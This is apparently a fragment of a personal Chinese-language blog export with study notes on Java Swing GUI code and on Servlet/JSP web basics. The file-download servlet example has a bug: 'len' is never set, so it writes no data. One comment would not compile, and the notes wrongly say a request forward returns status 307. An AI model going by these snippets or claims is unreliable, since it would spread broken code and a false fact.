class=\"comment\">//失去焦点的时候做的事情</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">focusGained</span><span class=\"params\">(FocusEvent e)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取焦点的时候做的事情</span></span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jb.addActionListener(<span class=\"keyword\">new</span> ActionListener()&#123;</span><br><span class=\"line\">\t<span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span></span>&#123;</span><br><span class=\"line\">     <span class=\"comment\">//单击鼠标时执行   </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.event.ActionEvent;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> FlowLayout());<span class=\"comment\">//设置网格布局</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;test&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JTextArea jTextArea=<span class=\"keyword\">new</span> JTextArea();</span><br><span class=\"line\">        jTextArea.setLineWrap(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        JButton jButton=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;希望你对你对人生也是这个态度&quot;</span>);</span><br><span class=\"line\">        jf.add(jTextArea);</span><br><span class=\"line\">        jf.add(jButton);</span><br><span class=\"line\">        jButton.addActionListener(<span class=\"keyword\">new</span> AbstractAction() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\">                jTextArea.append(<span class=\"string\">&quot;啊对对对&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228141558056.png\" alt=\"image-20211228141558056\" style=\"zoom:67%;\" />\n\n<h5 id=\"综合实践\"><a href=\"#综合实践\" class=\"headerlink\" title=\"综合实践\"></a>综合实践</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.filechooser.FileNameExtensionFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.event.ActionEvent;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.event.ActionListener;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedWriter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileWriter;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S9_2</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> String path;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">readText</span><span class=\"params\">(String path,Object obj)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        JTextArea jTextArea=(JTextArea) obj;</span><br><span class=\"line\">        FileReader fileReader=<span class=\"keyword\">new</span> FileReader(path);</span><br><span class=\"line\">        BufferedReader bufferedReader=<span class=\"keyword\">new</span> BufferedReader(fileReader);</span><br><span class=\"line\"></span><br><span class=\"line\">        String line;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>((line=bufferedReader.readLine())!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            jTextArea.append(line);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        bufferedReader.close();</span><br><span class=\"line\">        fileReader.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">saveText</span><span class=\"params\">(String path,Object obj)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        JTextArea jTextArea=(JTextArea) obj;</span><br><span class=\"line\">        BufferedWriter bufferedWriter=<span class=\"keyword\">new</span> BufferedWriter(<span class=\"keyword\">new</span> FileWriter(path));</span><br><span class=\"line\">        bufferedWriter.write(jTextArea.getText());</span><br><span class=\"line\">        bufferedWriter.flush();</span><br><span class=\"line\">        bufferedWriter.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jFrame=<span class=\"keyword\">new</span> JFrame(<span class=\"string\">&quot;S9_2&quot;</span>);</span><br><span class=\"line\">        jFrame.setLayout(<span class=\"keyword\">new</span> FlowLayout(FlowLayout.CENTER));</span><br><span class=\"line\">        jFrame.setBounds(<span class=\"number\">500</span>,<span class=\"number\">500</span>,<span class=\"number\">600</span>,<span class=\"number\">500</span>);</span><br><span class=\"line\">        JTextArea jTextArea=<span class=\"keyword\">new</span> JTextArea(<span class=\"number\">20</span>,<span class=\"number\">50</span>);</span><br><span class=\"line\">        JTextField jTextField=<span class=\"keyword\">new</span> JTextField(<span class=\"number\">35</span>);</span><br><span class=\"line\">        <span class=\"comment\">//把文本域放进jScrollPane让其拥有滚动条</span></span><br><span class=\"line\">        JScrollPane jScrollPane=<span class=\"keyword\">new</span> JScrollPane(jTextArea);</span><br><span class=\"line\">        JLabel jLabel=<span class=\"keyword\">new</span> JLabel(<span class=\"string\">&quot;File:&quot;</span>);</span><br><span class=\"line\">        JButton Browse=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;Browse&quot;</span>);</span><br><span class=\"line\">        Browse.addActionListener(<span class=\"keyword\">new</span> ActionListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\">                </span><br><span class=\"line\">             \t<span class=\"comment\">//文件选择组件</span></span><br><span class=\"line\">                JFileChooser chooser =<span class=\"keyword\">new</span> JFileChooser(<span class=\"string\">&quot;C:/&quot;</span>);</span><br><span class=\"line\">                FileNameExtensionFilter filter = <span class=\"keyword\">new</span> FileNameExtensionFilter(</span><br><span class=\"line\">                        <span class=\"string\">&quot;文本文档&quot;</span>, <span class=\"string\">&quot;txt&quot;</span>);</span><br><span class=\"line\">                chooser.setFileFilter(filter);</span><br><span class=\"line\">                <span class=\"keyword\">int</span> returnVal = chooser.showOpenDialog(jFrame);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(returnVal == JFileChooser.APPROVE_OPTION) &#123;</span><br><span class=\"line\">                    path=chooser.getSelectedFile().getAbsolutePath();</span><br><span class=\"line\">                    jTextField.setText(path);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        JButton Clear=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;Clear&quot;</span>);</span><br><span class=\"line\">        Clear.addActionListener(<span class=\"keyword\">new</span> ActionListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\">                jTextArea.setText(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        JButton Read=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;Read&quot;</span>);</span><br><span class=\"line\">        Read.addActionListener(<span class=\"keyword\">new</span> ActionListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                    readText(path,jTextArea);</span><br><span class=\"line\">                &#125;<span class=\"keyword\">catch</span> (Exception ex)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        JButton Save=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;Save&quot;</span>);</span><br><span class=\"line\">        Save.addActionListener(<span class=\"keyword\">new</span> ActionListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                    saveText(path,jTextArea);</span><br><span class=\"line\">                &#125;<span class=\"keyword\">catch</span> (Exception ex)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        JButton Exit=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;Exit&quot;</span>);</span><br><span class=\"line\">        Exit.addActionListener(<span class=\"keyword\">new</span> ActionListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\">                System.exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"comment\">//设置滚动条一直显示</span></span><br><span class=\"line\">        jScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);</span><br><span class=\"line\">        jFrame.add(jLabel);</span><br><span class=\"line\">        jFrame.add(jTextField);</span><br><span class=\"line\">        jFrame.add(Browse);</span><br><span class=\"line\">        jFrame.add(jScrollPane);</span><br><span class=\"line\">        jFrame.add(Clear);</span><br><span class=\"line\">        jFrame.add(Read);</span><br><span class=\"line\">        jFrame.add(Save);</span><br><span class=\"line\">        jFrame.add(Exit);</span><br><span class=\"line\">        jFrame.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211229002852293.png\" alt=\"image-20211229002852293\" style=\"zoom:67%;\" />\n"},{"title":"java_web","date":"2022-01-11T12:38:27.000Z","_content":"\nhttp1.0:客户端与web服务器连接后,只能获得一个web资源,断开连接\n\nhttp2.0: 客户端与web服务器连接后,可以获得多个web资源\n\n<!--more-->\n\n##### Http响应\n\n响应状态码\n\n200: 请求响应成功\n\n3**: 请求重定向\n\n4**: 找不到资源\n\n5**: 服务器代码错误500 502(网关错误)\n\n##### MAVEN环境配置\n\nM2_HOME   maven目录下的bin目录\n\nMAVEN_HOME  maven目录\n\npath中配置  %MAVEN_HOME%\\bin\n\n#### Servlet\n\n##### Servlet简介\n\n要在web.xml中导包\n\n- Servlet就是sun公司开发动态web的一门技术\n- Sun在这些API中提供一个接口叫做:Servlet,如果你想开发一个Servlet程序,只需要完成两个小步骤:\n  - 编写一个类,实现Servlet接口\n  - 把开发好的java类部署到web服务器中\n\nHelloServlet\n\n```java\npublic class helloServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        PrintWriter writer=resp.getWriter();//响应流\n        writer.println(\"hello,Servlet\");\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n\n    }\n}\n```\n\n目录结构\n\n![image-20220113162720716](https://gitee.com/blue_satchel/images/raw/master/image-20220113162720716.png)\n\n##### 编写Servlet映射\n\n写的是java程序,但是要通过浏览器访问,而浏览器需要连接web服务器,所以我们需要在web服务中注册我们写的servlet,还需要给它一个浏览器能够访问的路径\n\n![image-20220113162502747](https://gitee.com/blue_satchel/images/raw/master/image-20220113162502747.png)\n\n![image-20220113162617543](https://gitee.com/blue_satchel/images/raw/master/image-20220113162617543.png)\n\n请求/hello后,会在web.xml中找/hello对应的servlet-name  hello,然后再向上找hello对应的servlet-class\n\n##### servlet原理\n\n本质上就是requset调用servlet中的service抽象类中我们自己实现的方法,再返回给servlet\n\n![image-20220113163642745](https://gitee.com/blue_satchel/images/raw/master/image-20220113163642745.png)\n\n##### Mapping问题\n\n- 一个servlet可以指定一个或者多个路径,(本质上都是请求同一个class)\n\n- 一个servlet可以指定通用(默认)映射路径\n\n  - ```xml\n    <servlet-mapping>\n    \t<servlet-name>hello</servlet-name>\n        <url-pattern>/hello/*</url-pattern>  <!--请求hello/下的都会请求到hello-->\n    </servlet-mapping>\n    ```\n\n- 默认请求路径(等于替代掉了index吧....)\n\n  - ```xml\n    <servlet-mapping>\n    \t<servlet-name>hello</servlet-name>\n        <url-pattern>/*</url-pattern>  <!--默认请求到hello-->\n    </servlet-mapping>\n    ```\n\n    \n\n- 可以自定义后缀实现请求映射(类似于正则)\n\n  - ```xml\n    <servlet-mapping>\n    \t<servlet-name>hello</servlet-name>\n        <url-pattern>*.abcd</url-pattern>  <!--只要请求后缀有abcd都会映射到hello-->\n    </servlet-mapping>\n    ```\n\n    \n\n#### ServletContext\n\nweb容器在启动的时候,它会为每个web程序都创建一个对应的ServletContext对象,它代表了当前的web应用\n\n##### 共享数据\n\n很像android中页面传参的intent.putExtra和intent.getExtra\n\n- 在一个servlet中保存的数据,可以在另外一个servlet中拿到\n\n有一说一,java万物皆对象的思想确实牛逼,继承了直接就可以用父类方法,不同子类还能互动\n\n![image-20220113173732922](https://gitee.com/blue_satchel/images/raw/master/image-20220113173732922.png)\n\n![image-20220113173739121](https://gitee.com/blue_satchel/images/raw/master/image-20220113173739121.png)\n\n![image-20220113173749274](https://gitee.com/blue_satchel/images/raw/master/image-20220113173749274.png)\n\n![image-20220113173756430](https://gitee.com/blue_satchel/images/raw/master/image-20220113173756430.png)\n\n注意点:因为setAttribute写在了helloServlet中的doGet里面,所以要先请求一下/hello,再去请求/getname\n\n记得类型转换为String\n\n##### 获取初始化参数\n\nweb.xml中\n\n```xml\n<context-param>\n    <param-name>url</param-name>\n    <param-value>jdbc:mysql//localhost:3306/mybatis</param-value>\n</context-param>\n```\n\njava类里面\n\n```java\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        resp.setContentType(\"text/html\");\n        resp.setCharacterEncoding(\"utf-8\");\n        ServletContext context=this.getServletContext();\n        String url = context.getInitParameter(\"url\");\n        resp.getWriter().print(url)        \n    }\n```\n\n请求对应页面会打印出jdbc:mysql//localhost:3306/mybatis\n\n##### 请求转发\n\n```java\npublic class dispatcher extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        ServletContext context= this.getServletContext();\n        context.getRequestDispatcher(\"/hello\").forward(req,resp);\n    }\n}\n```\n\n请求sd就等于请求了/hello,并且浏览器状态码为200,不是3**的重定向\n\n我觉得对于安全性来说很好,A请求B,B可以去请求C的内容,虽然A得到了C的内容,但是A永远只和B交流\n\n\n\n![image-20220113222128264](https://gitee.com/blue_satchel/images/raw/master/image-20220113222128264.png)\n\n##### 读取资源(配置)文件\n\nProperties\n\n- 在java目录下新建properties\n- 在resources目录下新建properties\n\n发现:都被打包到了同一个路径下:classes,俗称这个路径为classpath\n\n需要一个文件流\n\n### \n\n### HttpServletResponse\n\nweb服务器接收到客户端的http请求,针对这个请求,分别创建一个代表请求的HttpServletRequest对象,代表响应的一个HttpServletResponse对象\n\n获取客户端请求过来的参数,找HttpServletRequest\n\n如果要给客户端响应信息,找HttpServletResponse\n\n#### 响应状态码\n\n```java\nint SC_CONTINUE = 100;\n    int SC_SWITCHING_PROTOCOLS = 101;\n    int SC_OK = 200;\n    int SC_CREATED = 201;\n    int SC_ACCEPTED = 202;\n    int SC_NON_AUTHORITATIVE_INFORMATION = 203;\n    int SC_NO_CONTENT = 204;\n    int SC_RESET_CONTENT = 205;\n    int SC_PARTIAL_CONTENT = 206;\n    int SC_MULTIPLE_CHOICES = 300;\n    int SC_MOVED_PERMANENTLY = 301;\n    int SC_MOVED_TEMPORARILY = 302;\n    int SC_FOUND = 302;\n    int SC_SEE_OTHER = 303;\n    int SC_NOT_MODIFIED = 304;\n    int SC_USE_PROXY = 305;\n    int SC_TEMPORARY_REDIRECT = 307;\n    int SC_BAD_REQUEST = 400;\n    int SC_UNAUTHORIZED = 401;\n    int SC_PAYMENT_REQUIRED = 402;\n    int SC_FORBIDDEN = 403;\n    int SC_NOT_FOUND = 404;\n    int SC_METHOD_NOT_ALLOWED = 405;\n    int SC_NOT_ACCEPTABLE = 406;\n    int SC_PROXY_AUTHENTICATION_REQUIRED = 407;\n    int SC_REQUEST_TIMEOUT = 408;\n    int SC_CONFLICT = 409;\n    int SC_GONE = 410;\n    int SC_LENGTH_REQUIRED = 411;\n    int SC_PRECONDITION_FAILED = 412;\n    int SC_REQUEST_ENTITY_TOO_LARGE = 413;\n    int SC_REQUEST_URI_TOO_LONG = 414;\n    int SC_UNSUPPORTED_MEDIA_TYPE = 415;\n    int SC_REQUESTED_RANGE_NOT_SATISFIABLE = 416;\n    int SC_EXPECTATION_FAILED = 417;\n    int SC_INTERNAL_SERVER_ERROR = 500;\n    int SC_NOT_IMPLEMENTED = 501;\n    int SC_BAD_GATEWAY = 502;\n    int SC_SERVICE_UNAVAILABLE = 503;\n    int SC_GATEWAY_TIMEOUT = 504;\n    int SC_HTTP_VERSION_NOT_SUPPORTED = 505;\n```\n\n#### 常见应用\n\n##### 1.向浏览器输出消息\n\ngetWriter(),getOutputStream()\n\n![image-20220113224928187](https://gitee.com/blue_satchel/images/raw/master/image-20220113224928187.png)\n\n##### 2.下载文件\n\n1. 要获取下载文件路径\n2. 下载文件名是啥\n3. 设置想办法让浏览器能够支持下载我们需要的东西\n4. 获取下载文件的输入流\n5. 创建缓冲区\n6. 获取OutputStream对象\n7. 将FileOutputStream流写入到buffer缓冲区\n8. 使用OutputStream将缓冲区中的数据输出到客户端\n\n```java\npackage com.blue.servlet;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.ServletOutputStream;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class down extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String realPath=\"F:\\\\Project\\\\maven\\\\maven_web_1\\\\src\\\\main\\\\resources\\\\img.png\";\n        //2.获取下载文件名\n        String filename=realPath.substring(realPath.lastIndexOf(\"\\\\\")+1);\n        //3.设置头\n        /中文文件名的话还要设置编码\n        resp.setHeader(\"Content-Disposition\",\"attachment;filename=\"+filename);\n        //4.获取下载文件的输入流\n        FileInputStream in=new FileInputStream(realPath);\n        //5.创建缓冲区\n        int len=0;\n        byte[] buffer=new byte[1024];\n        //6.获取OutputStream对象\n        ServletOutputStream out=resp.getOutputStream();\n        //7.将fileOutputStream流写入到buffer缓冲区,使用OutputStream将缓冲区中的数据输出到客户端\n        while (in.read(buffer)>0){\n            out.write(buffer,0,len);\n        }\n        in.close();\n        out.close();\n    }\n}\n\n```\n\n#### 实现网页重定向\n\n不同于servlet的资源请求重定向,response是通过浏览器实现的重定向\n\n`resp.sendRedirect(\"路径\");`\n\n`&{pageContext.request.contextPath}`代表当前项目路径\n\n重定向和转发的区别:\n\n编码:转发307,重定向302\n\n相同点:页面都会跳转\n\n不同点:url变与不变\n\n\n\n\n\n\n\n### HttpServletRequest\n\n通过HttpServletRequest获取客户端的信息\n\n获取前端提交的参数\n\n`req.getParameter(\"username\");`\n\n`getParamaterValues();`返回一个字符数组\n\n#### Cookie\n\n- 一个Cookie只能保存一个信息\n- 一个web站点可以给浏览器发送多个cookie,最多存放20个cookie\n- cookie大小有限制4kb\n- 300个cookie浏览器上限\n\n删除Cookie\n\n- 不设置有效期,关闭浏览器,自动失效\n- 设置有效期为0\n\n传递中文记得使用URLEncoder.encode(\"中文\",\"utf-8\");\n\n#### Session\n\n- 服务器会给每一个用户(浏览器)创建一个Session对象\n- 一个Session独占一个浏览器,只要浏览器没有关闭,这个Session就存在\n- 用户登录之后,整个网站它都可以访问\n\n### JSP\n\nJAVA Server Pages\n\n最大特点:\n\n- 写JSP就像在写HTML\n- 区别:\n  - HTML静态数据\n  - JSP页面可以嵌入JAVA代码,为用户提供动态数据\n\nJSP本质上就是Servlet\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220114211237653.png\" alt=\"image-20220114211237653\"  />\n\n##### jsp与对应jsp.java转换关系\n\n只要是java代码就原封不动的输出\n\n如果是HTML代码,就会被转换为:\n\n```\nout.write(\"<xxxxxxx>\")\n```\n\n\n\n#### JSP基础语法\n\n开始前要先导入依赖,[maven依赖在线查询](https://mvnrepository.com/)\n\n```xml\n<!--Servlet依赖-->\n    <dependency>\n      <groupId>javax.servlet</groupId>\n      <artifactId>javax.servlet-api</artifactId>\n      <version>3.1.0</version>\n    </dependency>\n    <!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api -->\n    <!--JSP依赖-->\n    <dependency>\n      <groupId>javax.servlet.jsp</groupId>\n      <artifactId>javax.servlet.jsp-api</artifactId>\n      <version>2.3.3</version>\n      <scope>provided</scope>\n    </dependency>\n    <!--JSTL表达式的依赖-->\n\n    <dependency>\n      <groupId>org.glassfish.web</groupId>\n      <artifactId>jakarta.servlet.jsp.jstl</artifactId>\n      <version>2.0.0</version>\n    </dependency>\n    <!--standard标签库-->\n    <!-- https://mvnrepository.com/artifact/taglibs/standard -->\n    <dependency>\n      <groupId>taglibs</groupId>\n      <artifactId>standard</artifactId>\n      <version>1.1.2</version>\n    </dependency>\n\n```\n\n#### 语法\n\n##### 表达式\n\n```jsp\n<%=变量或者表达式%>\n<%=new java.util.Date()%>\n\n```\n\n可以用${变量名}(EL表达式)代替,更高级,并且会将一些错误默认不显示,比如不存在的变量\n\n##### 脚本片段\n\n```jsp\n<%\n\tjava脚本片段\n%>\n```\n\n##### JSP声明\n\n```jsp\n<%!\nprivate int globalVar = 0;    \n%>\n```\n\n会被编译到jsp生成的java类中,其他的会被生成到对应的java文件中的jspService方法中\n\n##### 在代码中嵌入HTML元素\n\n```jsp\n<html>\n<body>\n<%for (int i=0;i<5;i++){\n    %>\n    <h1>hello,world <%=i%> </h1>\n<%\n    }\n%>\n</body>\n</html>\n```\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220115211903441.png\" alt=\"image-20220115211903441\" style=\"zoom:80%;\" />\n\n### JSP指令\n\n##### 配置错误页面<%@page  args...%>\n\n##### 方法1\n\n![image-20220115215532167](https://gitee.com/blue_satchel/images/raw/master/image-20220115215532167.png)\n\n```jsp\n<%@page errorPage=\"error/500.jsp\" %>\n```\n\n##### 